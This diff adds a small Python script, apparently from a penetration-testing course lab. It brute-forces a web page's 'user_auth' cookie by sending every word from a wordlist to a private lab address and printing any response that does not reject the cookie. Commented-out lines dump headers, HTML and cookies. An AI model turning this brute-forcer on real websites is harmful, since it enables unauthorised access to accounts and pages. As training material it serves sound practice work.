@@ -1,0 +1,33 @@
+import requests
+
+lines = []
+
+with open("/home/student/pie_time/raft-small-words.txt","r") as raft:
+    lines = raft.readlines()
+
+for i in lines:
+    mycookie = {'user_auth':i.replace("\n","")}
+    response = requests.get('http://172.25.0.29/page1.php', cookies=mycookie)
+    currentPageText = response.text
+    if "Incorrect Cookie" not in currentPageText:
+        print(response.text)
+
+
+
+#r = requests.get('http://172.25.0.29/index.php')
+
+#web_headers = r.headers
+#print("Headers returned")
+#print(web_headers)
+
+#web_html = r.text
+#print("Html returned")
+#print(web_html)
+
+#web_status_code = r.status_code
+#print("HTTP status returned")
+#print(web_status_code)
+
+#web_cookies = r.cookies
+#print("returned cookies")
+#print(web_cookies)
